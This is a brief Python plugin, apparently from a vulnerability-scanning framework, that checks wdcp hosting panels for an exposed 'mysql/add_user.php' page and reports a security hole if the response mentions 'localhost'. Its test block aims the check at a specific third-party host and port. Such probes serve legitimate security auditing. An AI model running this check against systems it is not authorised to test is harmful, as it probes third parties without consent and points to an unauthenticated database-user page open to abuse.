#Referer:	http://www.securityfocus.com/archive/1/534437
def assign(service, arg):
    if service == "wdcp":
        return True, arg

def audit(args):
    payload = 'mysql/add_user.php'
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and 'localhost' in content:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wdcp', 'http://wxw80.tem.com.cn:5368/')[1])
